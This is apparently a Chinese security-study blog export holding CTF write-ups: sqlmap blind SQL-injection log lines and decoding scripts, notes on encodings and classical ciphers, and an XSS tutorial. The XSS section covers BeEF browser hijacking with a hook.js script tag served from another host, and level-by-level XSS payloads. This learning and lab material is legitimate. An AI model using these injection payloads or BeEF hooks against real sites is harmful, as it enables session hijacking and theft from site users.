(http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),3,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),4,1))=103-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),5,1))=123-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),6,1))=109-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),7,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),8,1))=121-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),9,1))=105-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),10,1))=121-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),11,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),12,1))=104-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),13,1))=101-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),14,1))=105-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),15,1))=49-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),16,1))=57-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),17,1))=54-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),18,1))=53-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),19,1))=97-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),20,1))=101-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),21,1))=55-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),22,1))=53-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),23,1))=54-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),24,1))=57-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"192.168.0.1 - - [13/Oct/2018:12:38:14 0000] "GET /flag.php?user=hence' AND ORD(MID((SELECT IFNULL(CAST(secret AS CHAR),0x20) FROM haozi.secrets ORDER BY secret LIMIT 0,1),38,1))=125-- pZaF HTTP/1.1" 200 327 "-" "sqlmap/1.2#pip (http://sqlmap.org)"'''import rea = re.findall('LIMIT.*?=(.*?)--',data)for i in a: i = int(i) print(chr(i),end='') 神奇的字符串有一串神奇的字符串bE0veldtTDs7NzlTe3hzbSFYSj5Sa2U6eyQ4NyVrI3FvWFU6Qls7QlVK，还有一张纸条写着589164 先用base64解密，得到： lM/zWmL;;79S{xsm!XJ&gt;Rke:{$87%k#qoXU:B[;BUJ很杂乱的字符串，想到提示589164，既然有base64，那么提示的意思就是： base58,base91,base64先base91解密，再base58解密 你真的了解base的原理吗hint：Python ! Python ! Python! Python！ 那么多字符串，电脑卡的一批！！！！ 后来想起来提示，我可以不用进行复制粘贴进行解码啊，可以先把密文下载下来，再用函数对文件读写再解码，嘻嘻~ 开始的加密方式为base85，解码后为base64，然后为16进制，再转字符串，循环… 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import base64url = 'C:/Users/腾飞/Desktop/base_python.txt'f = open(url)content = f.readlines()content = content[0]first = base64.b85decode(content).decode('utf-8')second = base64.b64decode(first).decode('utf-8')third = ''.join([chr(int(b, 16)) for b in [second[i:i+2] for i in range(0, len(second), 2)]])first1 = base64.b85decode(third).decode('utf-8')second1 = base64.b64decode(first1).decode('utf-8')third1 = ''.join([chr(int(b, 16)) for b in [second1[i:i+2] for i in range(0, len(second1), 2)]])first2 = base64.b85decode(third1).decode('utf-8')second2 = base64.b64decode(first2).decode('utf-8')third2 = ''.join([chr(int(b, 16)) for b in [second2[i:i+2] for i in range(0, len(second2), 2)]])first3 = base64.b85decode(third2).decode('utf-8')second3 = base64.b64decode(first3).decode('utf-8')third3 = ''.join([chr(int(b, 16)) for b in [second3[i:i+2] for i in range(0, len(second3), 2)]])first4 = base64.b85decode(third3).decode('utf-8')second4 = base64.b64decode(first4).decode('utf-8')third4 = ''.join([chr(int(b, 16)) for b in [second4[i:i+2] for i in range(0, len(second4), 2)]])first5 = base64.b85decode(third4).decode('utf-8')second5 = base64.b64decode(first5).decode('utf-8')third5 = ''.join([chr(int(b, 16)) for b in [second5[i:i+2] for i in range(0, len(second5), 2)]])first6 = base64.b85decode(third5).decode('utf-8')second6 = base64.b64decode(first6).decode('utf-8')third6 = ''.join([chr(int(b, 16)) for b in [second6[i:i+2] for i in range(0, len(second6), 2)]])first7 = base64.b85decode(third6).decode('utf-8')second7 = base64.b64decode(first7).decode('utf-8')third7 = ''.join([chr(int(b, 16)) for b in [second7[i:i+2] for i in range(0, len(second7), 2)]])first8 = base64.b85decode(third7).decode('utf-8')second8 = base64.b64decode(first8).decode('utf-8')third8 = ''.join([chr(int(b, 16)) for b in [second8[i:i+2] for i in range(0, len(second8), 2)]])first9 = base64.b85decode(third8).decode('utf-8')second9 = base64.b64decode(first9).decode('utf-8')third9 = ''.join([chr(int(b, 16)) for b in [second9[i:i+2] for i in range(0, len(second9), 2)]])print(third9) txt500 看了wp想不明白为什么关键字是key而不是flag，why！！！ 1234567891011import ospath = 'C:/Users/腾飞/Desktop/flag/'keyvalue = input('请输入key： ')for root, dirs, files in os.walk(path): for file in files: file = path + file f = open(file, 'r') content = f.readlines() content = ''.join(content) if keyvalue in content: print(file) 输入 key{ ，得到一个文件夹，再打开搜索即可，提交时还要把key换成flag。。 P:使用linux的grep进行搜索也可以 流量分析找到一条使用的tcp协议，然后tcp流量追踪 被截获的电报一个音频文件，滴答声，为摩斯密码，使用Audacity这款音频编辑录音软件打开 其中比较窄的线为. 比较宽的线为- 中间间隔大的需要加上空格 得到 .- -.-. - .. ----- -. --.- ..- .. -.-. -.-摩斯密码解码，将flag中的英文字母大写提交 头像用010editor打开，但是头尾都没有发现flag，看了wp发现flag在中间？emmm 按ctrl+F，选择text，输入flag进行搜索 将找到的flag中间进行base解码再md5加密 进制转换1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331观察数字可发现： 每一位的数都不超过4，则为4进制，先转换为10进制，再转换为ascii字符 12345strings = '1212 1230 1201 1213 1323 1012 1233 1311 1302 1202 1201 1303 1211 301 302 303 1331lists = strings.split(' ')for i in lists: i = int(i, base=4) print(chr(i), end='') Snake太形象了这题 先使用foremost分离出class文件，再进行jad反编译，在文件源码中搜索flag时在Game.jad文件有所发现有这样一段代码： if(score &gt;= 500 &amp;&amp; isshow) { String flag = &quot;eobdxpmbhf\\jpgYaiibYagkc{&quot;; int key = snake.len - score; 3 String xx = &quot;&quot;; for(int i = 0; i &lt; flag.length() / 2; i++) { char c = flag.charAt(i); c ^= key; xx = (new StringBuilder(String.valueOf(xx))).append(c).toString(); } for(int i = flag.length() / 2 + 1; i &lt; flag.length(); i++) { char c = flag.charAt(i); c ^= key * 2; xx = (new StringBuilder(String.valueOf(xx))).append(c).toString(); } JOptionPane.showInputDialog(null, &quot;This is your flag CALCULATE BY YOUR SCORE:\n&quot;, &quot;Congratulations&quot;, -1, null, null, xx); isshow = false; }没学过java，不过这段代码还是不难的，搜索了一波不认识的函数： 1.charAt() 方法用于返回指定索引处的字符。索引范围为从 0 到 length() - 1 2.StringBuilder是一个类，可以用来处理字符串，最简单的用法： StringBuilder sb=new StringBuilder(); sb.Append(&quot;123&quot;); sb.Append(&quot;456&quot;); string str=sb.ToString(); 最后得到的str字符串的值就是&quot;123456&quot; 3.String.valueOf(b) : 将变量 b 转换成字符串 key的值在游戏中即可算出：初始的时候蛇长度为3，吃一个食物长度加一，则key为3 用python表示出： flag = "eobdxpmbhf\\jpgYaiibYagkc{" key = 3 xx = "" length = len(flag) for i in range(0, length//2): c = ord(flag[i]) c ^= key xx += chr(c) print(xx) for i in range(length//2+1, length): c = ord(flag[i]) c ^= key*2 xx += chr(c) print(xx)]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编码、加密学习]]></title>
    <url>%2F2019%2F01%2F20%2F%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[学习编码、加密方式 编码发展过程计算机只能处理数字，而且是以二进制形式来存储数据的，在存储前和显示时要进行字符与二进制的转换 ASCII计算机是美国人发明的，ASCII，即‘美国信息交换标准代码’，是美国人为自己设计的。迄今为止共收录了 128 个字符，包含了基本的拉丁字母（英文字母）、阿拉伯数字（也就是 1234567890）、标点符号（,.!等）、特殊符号（@#$%^&amp;等）以及一些具有控制功能的字符（往往不会显示出来）。 这128个字符占用了一个字节的前7位，最前面的一位统一规定为0 ANSI字符集ANSI并不是某一种特定的字符编码，而是在不同的系统中，ANSI表示不同的编码 为了扩充ASCII编码，以用于显示本国的语言，不同的国家和地区制定了不同的标准，由此产生了 GB2312, BIG5, JIS 等各自的编码标准；这些使用2个字节来代表一个字符的各种汉字延伸编码方式成为ANSI编码 通常使用 0x000x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x800xFFFF来编码，即扩展的ASCII编码。 在简体中文Windows操作系统中，ANSI 编码代表 GBK 编码；在繁体中文Windows操作系统中，ANSI编码代表Big5 GB2312和GBK中国制定了GB2312编码，将中文编了进去，GB 是“国标” 二字的汉语拼音缩写； 由于一个字节能表示的最大整数为255，要表示中文，显然一个字节是不够的，至少需要两个字节，而且还不能与ASCII编码冲突 GB2312是简体中文的字符集 GBK向下与GB2312编码兼容，支持简体中文及繁体中文；GBK，即“国标”“扩展”首字母； Unicode但全世界的语言有几百种，各国的编码都不一样；在多语言混合的文本中，会显示乱码 为了解决编码混乱的问题，出现了Unicode编码，它为每种语言中的每个字符设定了统一并且唯一的二进制编码 一般两个字节表示一个字符(偏僻的可能需要四个) UTF-16 LE是windows上默认的Unicode编码方式 unicode的不同编码类型： \u、&amp;#… hello编码成unicode： &amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;你好编码成unicode： \u4f60\u597dUTF-8Unicode 只是一个符号集，它只规定了符号的二进制代码，却没有规定这个二进制代码应该如何存储。 使用unicode编码会带来两个问题： 如何才能区别 Unicode 和 ASCII 如果文本上全都是英文，用Unicode编码比ASCII编码需要多一倍的存储空间 为了解决这个问题，出现了可变长编码UTF-8 UTF-8 是在互联网上使用最广的一种 Unicode 的实现方式 UTF-8的特点是对不同范围的字符使用不同长度的编码；它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。 UTF-8 的编码规则很简单：如果只有一个字节，那么最高的比特位为 0；如果有多个字节，那么第一个字节从最高位开始，连续有几个比特位的值为 1，就使用几个字节编码，剩下的字节均以 10 开头。 具体的表现形式为： 0xxxxxxx：单字节编码形式，这和 ASCII 编码完全一样，因此 UTF-8 是兼容 ASCII 的；110xxxxx 10xxxxxx：双字节编码形式；1110xxxx 10xxxxxx 10xxxxxx：三字节编码形式；11110xxx 10xxxxxx 10xxxxxx 10xxxxxx：四字节编码形式。 UTF-8最大的优势是，没有字节序的概念。所以特别适合用于字符串的网络数据传输，不用考虑大小端问题。对于非英文网页（对于我们而言，简单说东亚文字网页），能够避免各种乱码问题。 编码应用实例将windows默认语言更改了，会发现使用ANSI编码的文本文档出现了乱码，而unicode和utf-8不会出现 在记事本写入英文，发现unicode编码后的字节比utf-8编码后的字节多了一倍 乱码问题： 存文件时乱码：文件内有各个国家的文字，以单一编码格式去保存，则会保存失败，打开时会看到乱码 读文件时乱码：读文件时选择了错误的编码，就会出现乱码 参考：https://blog.csdn.net/Deft_MKJing/article/details/79460485https://www.cnblogs.com/weigege2015/p/7583632.html python字符串的编码与解码字符串在Python内部的表示是unicode编码，因此，在做编码转换时，通常需要以unicode作为中间编码，即先将其他编码的字符串解码（decode）成unicode，再从unicode编码（encode）成另一种编码。 decode的作用是将其他编码的字符串转换成unicode编码，如str1.decode(‘gb2312’)，表示将gb2312编码的字符串转换成unicode编码。 encode的作用是将unicode编码转换成其他编码的字符串，如str2.encode(‘gb2312’)，表示将unicode编码的字符串转换成gb2312编码。 在Python3中的字符串类型： 文本字符串类型： 即我们通常定义的str类型的对象。在Python3中，str类型的对象都是Unicode， 因此对于str类型的对象只有encode（）方法，没有decode（）方法， （若运行，会报错）。字节字符串类型： 即byte类型的对象。对于该类对象，是由str类型对象使用encode()方法产生， byte对象可以进行解码过程，从而得到真正的内容。示例代码： 1234567s = '中文's = s.encode('gb2312')print(s)print(type(s))s = s.decode('gb2312')print(s)print(type(s)) 输出为： b&apos;\xd6\xd0\xce\xc4&apos; &lt;class &apos;bytes&apos;&gt; 中文 &lt;class &apos;str&apos;&gt;编码类型与特点url编码也称百分号编码：一个字符的ASCII码的16进制再加上百分号 http://%77%77%77%2E%62%61%69%64%75%2E%63%6F%6D/base编码base16base16就是用16（2的4次方）个字符，对二进制数据进行编码的方式 Base16 包含 16 个 16 进制大写数字。索引表： base32base32就是用32（2的5次方）个字符，对二进制数据进行编码的方式 Base32 包含 26 个大写字母和 2-7 的数字。索引表： base36base36编码，它的编码中包含0~9的数字，加上所有26个字母，不区分大小写，不包含任何标点，所有的字母要不全大写，要不全小写。所以加起来就是 &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;,或者 &apos;0123456789abcdefghijklmnopqrstuvwxyz&apos;base58Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址。 Base58不含Base64中的0（数字0）、O（大写字母o）、l（小写字母 L）、I（大写字母i），以及“+”和“/”两个字符。 设计Base58主要的目的是： 避免混淆。在某些字体下，数字0和字母大写O，以及字母大写I和字母小写l会非常相似。 不使用&quot;+&quot;和&quot;/&quot;的原因是非字母或数字的字符串作为帐号较难被接受。 没有标点符号，通常不会被从中间分行。 大部分的软件支持双击选择整个字符串。采用辗转相除法进行编码 索引表： base6226个字母的大小写再加上0-9，一共62个字符。 base64Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息；Base64就是一种基于64个可打印字符来表示二进制数据的方法。 base64编码要求把3个8位字节转化为4个6位字节，之后在6位的前面补两个0(对应的十进制最大为63)，形成8位一个字节的形式。之后转换为二进制，输出其对应的字符；如果剩下的字符不足3个字节，则用0填充，输出字符使用‘=’，因此编码后输出的文本末尾可能会出现1或2个‘=’ 文本：flag 加密后： ZmxhZw==加密过程 各字符对应的ascii码的二进制： f - 01100110 l - 01101100 a - 01100001 g - 011001111.前3个8位可以转化为4个6位： 011001 100110 110001 100001在每个6位前补两个0： 00011001 00100110 00110001 001000012.最后1个8位用0填充： 01100111 00000000 00000000 转换为4个6位： 011001 110000 000000 000000在每个6位前补两个0： 00011001 00110000 00000000 000000003.转换后为： 00011001 00100110 00110001 00100001 00011001 00110000 00000000 00000000其对应的10进制为： 25 38 49 33 25 48 0 0参照索引表，得到其对应的编码(由于0是补位后得到的，因此转换为=)： Z m x h Z w = =索引表： base85也称为Ascii85，是由Paul E. Rutter为btoa实用程序开发的二进制文本编码形式。通过使用五个ASCII字符来表示四个字节的二进制数据（使编码大小¹/ 4大于原始值，假设每个ASCII字符为8位），它比uuencode或Base64更有效，它使用四个字符来表示三个字节数据的增加（¹/ 3增加，假设每个ASCII字符有8位）。 它的主要现代用途是Adobe的PostScript和可移植文档格式文件格式，以及Git使用的二进制文件的补丁编码。 使用：0–9, A–Z, a–z, 以及23个字符： !#$%&amp;()*+-;&lt;=&gt;?@^_`{|}~ 来编码二进制数据。 实体编码在 HTML 中，某些字符是预留的。不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。 如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。 类型： &amp;lt; &lt; &amp;nbsp; 空格 &amp;gt; &gt;javascript编码这类编码可直接放在控制台运行 JSfuck编码类型： [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])escape()编码escape 方法返回一个包含了 charstring 内容的字符串值（ Unicode 格式）。所有空格、标点、重音符号以及 其他非 ASCII 字符都用 %xx 编码代替，其中 xx 等于表示该字符的十六进制数。例如，空格返回的是“%20 ” 。字符值大于 255 的以 %uxxxx 格式存储。 文本： The 编码后： %u0054%u0068%u0065解码: 使用unescape() 这种类型的也为escape编码： \134\170\65\143\134\170\67\65\134\170\63\60\134\170\63\60\aaencode编码类型： (o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)16进制将其转化为10进制再对照ASCII编码字符即可 636A56355279427363446C4A49454A7154534230526D684356445A31614342354E326C4B4946467A5769426961453067或 \x5c\x75\x30\x30\x35\x33\x5c\x75\x30\x30\x37\x34\x5c\x75\x30\x30\x37\x32\x5c\x75\x30\x30\x36\x39\x5c与佛论禅文本： flag 加密结果： 佛曰：即盡怯輸殿無冥曳盧哆寫侄死梵迦怯伊夷怯蘇諳隸哆婆無http://www.keyfc.net/bbs/tools/tudoucode.aspx 社会主义核心价值观编码文本： hello 加密结果： 公正爱国公正平等公正诚信文明公正友善公正公正友善敬业https://sym233.github.io/core-values-encoder/ Ook编码由 Ook! Ook. Ook?这三种字符串组成 解密：http://tool.bugku.com/brainfuck/ 另： ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...这种类型的也为oOk加密 BrainFuck这竟然是一种编程语言 +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]由八种字符构成： 盲文是专为盲人设计、靠触觉感知的文字 https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen 加密类型与特点栅栏加密把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 文本： helloworld key： 2加密过程： he ll ow or ld加密结果： hloolelwrdhttp://www.zjslove.com/3.decode/zhalan/index.html 凯撒密码明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。 当偏移量为13，凯撒密码的名称为ROT13 文本： guest 偏移量： 13加密过程： g -&gt; t u -&gt; h e -&gt; r s -&gt; f t -&gt; g加密结果： thrfghttp://www.zjslove.com/3.decode/kaisa/index.html ASCII移位加密类似于凯撒加密，将字符的ASCII码进行移动一定位数再转换为字符 文本： e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA将ASCII向前偏移四位： 解密： a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==12345678key = int(input('请输入移动的位数： '))string = input('请输入待解密的字符串： ')decodes = ''for i in string: i = chr(ord(i)-key) decodes+=iprint(decodes) 还有一种ASCII移位加密，并不是字符的ASCII码都移动相同的位数，而是按照次序递增或递减 文本： flag 文本的ascii：102 108 97 103按照1、2、3…的顺序递增偏移 加密后： 103 110 100 107 对应加密文本： gndk123456789string = input('请输入待解密的字符串： ')decodes = ''i = 1for k in string: k = chr(ord(k)-i) decodes+=k i+=1print(decodes) 培根密码加密时，明文中的每个字母都会转换成一组五个英文字母，转换后的五个字母由a、b或a和b组成 文本： hello 加密结果： AABBBAABAAABABBABABBABBBA索引表： 希尔密码每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26 http://www.practicalcryptography.com/ciphers/hill-cipher/ 摩斯密码摩尔斯电码，过去发电报使用的一种加密方式 ..-. .-.. .- --. ----.-- -----.-摩尔斯电码由两种基本信号组成，点信号‘.’，读‘滴’， 和长信号‘-’，读‘嗒’ 另外还有摩尔斯电码与ASCII对照表，因为ASCII字符对应二进制的01，而摩尔斯也是由两种字符.-组成，因此可有以下对应关系： 键盘中心加密不知道叫什么加密，对照键盘，中心字符的即为解密 文本： r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM 解密： tongyuan银河加密是一款游戏中使用的字体 仿射加密(affine)首先了解了一下三等于号(模等于)： https://zhidao.baidu.com/question/30953893.html加密过程： 1.将字母A-Z转化为对应的数字0-25 2.根据加密函数E(x)=(ax+b) mod 26，计算 3.数字对应的字符即为加密结果解密过程： 1.求出解密函数D(x)；a对应其逆元: 2.将求出的数字对应其字符得到原文本例如： E(x) = (5x + 8) mod 26 则： D(x) = 21(x - 8) mod 26参考： https://www.cnblogs.com/mq0036/p/6544055.html一道例题及python脚本： 1234567# question：y = 17x-8 flag&#123;szzyfimhyzd&#125;# d = 23(x+8)string = 'szzyfimhyzd'for i in string: i = chr(23*(ord(i)-97+8)%26+97) # 字符要转化为0-25，因此需减去97，转化为字符再加上 print(i,end='') 维吉尼亚密码Vigenenre密码是最著名的多表代换密码 Vigenenre密码使用一个词组作为密钥，密钥中每一个字母用来确定一个代换表，每一个密钥字母被用来加密一个明文字母，第一个密钥字母加密第一个明文字母，第二个密钥字母加密第二个明文字母，等所有密钥字母使用完后，密钥再次循环使用，于是加解密前需先将明密文按照密钥长度进行分组。密码算法可表示如下： 设密钥K=(k1,k2,…,kd)，明文M=(m1,m2,…,mn)，密文C=(c1,c2,…,cn)； 加密变换为：ci=Eki(mi)=mi+ki(mod 26) 解密变换为：mi=Dki(ci)=ci-ki(mod 26) 注：字母a-z对应0-25 例如： 文本： flag 秘钥： abcd运算过程： f - 5 l - 11 a - 0 g - 6 a - 0 b - 1 c - 2 d - 3 5+0 mod 26 = 5 - f 11+1 mod 26 = 12 - m 0+2 mod 26 = 2 - c 6+3 mod 26 = 9 - j即加密后得到密文：fmcj]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS学习]]></title>
    <url>%2F2019%2F01%2F13%2FXSS%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[分享会保存的一些学习资料 1，xss挑战练习http://xss.tesla-space.com/2，xss挑战平台练习https://www.cnblogs.com/bmjoker/p/9446472.html3，HTML事件属性http://www.w3school.com.cn/tags/html_ref_eventattributes.asp4，xss跨站脚本攻击（一）三种攻击类型https://blog.csdn.net/u011781521/article/details/53894399/5，xss基础https://blog.csdn.net/slpond/article/details/53380038 认识XSSXSS(cross-site script)，跨站脚本 XSS最大的特点就是可以注入恶意代码到用户浏览器的网页上，从而达到： 劫持用户会话 盗取cookie 钓鱼欺骗 强制弹出广告 提升用户权限 传播跨站脚本蠕虫 等等 XSS并不只是弹窗，弹窗只是用来测试是否存在XSS漏洞 XSS类型跨站脚本攻击，即插入恶意HTML代码并执行 XSS分为三类： 反射型(非持久型)数据流向： 浏览器-&gt;服务器-&gt;浏览器 存储型(持久型)数据流向： 浏览器-&gt;服务器-&gt;数据库-&gt;服务器-&gt;浏览器 dom型数据流向： url-&gt;浏览器 前两种XSS都会与服务器产生交互，后一种不会产生交互 beef的使用Beef是浏览器攻击框架的简称，是一款专注于浏览器的渗透测试工具。(XSS利用框架) 劫持浏览器原理使用beef生成恶意代码，发送给服务器，服务器存储这段代码 客户端访问服务器；之后即可通过控制恶意代码即可实现对客户端的控制 基本配置1.使用虚拟机打开Kali，进入终端搜索beef路径， find / -name beef并cd到目录，执行 ./beef2.执行后，Hook URL为漏洞地址；UI URL为beef界面地址，界面地址账号密码均为beef 3.在主机新建文件夹，写入 &lt;script src=&apos;http://192.168.159.128:3000/hook.js&apos;&gt;&lt;/script&gt;保存，双击文件执行 4.在beef的Online Browsers界面看到有个主机上线，点击Commands，里面有各种命令 一些命令网页跳转：打开 Browser-Hooked Domain-Redirect Browser输入跳转网址 http://www.baidu.com再点击右下角的执行，便看到刚才访问的Hook URL的空白页面进行了跳转，转到了百度页面。 挑战练习在进行测试时，使用的火狐浏览器，因为Chrome的过滤机制导致xss不能在上面测试。 level1 源代码： 修改url中的name参数为 &lt;script&gt;alert(&apos;hello&apos;)&lt;/script&gt;即可弹窗 level2 源代码： 输入asdf点击搜索，发现input标签中的value发生改变 则要闭合标签： &quot;&gt;&lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt;level3 源代码： 看着跟上一关差不多，就单双引号的差别，不过一试发现这一关把&lt; &gt;给编码了 输入 &quot;&gt;&lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt; 可以不适用尖括号，直接用HTML事件属性 鼠标移过输入框: &apos; onmousemove=alert(1)// 点击输入框: &apos; onclick=alert(1)// ...都可以成功弹窗 需要用双斜线注释后面的一个单引号 level4 源代码： &apos; onclick=alert(1)//level5这一关把&lt;script 转换成了 &lt;scr_ipt ，on转换成了 o_n &quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;asdf&lt;/a&gt; &quot;&gt;&lt;iframe 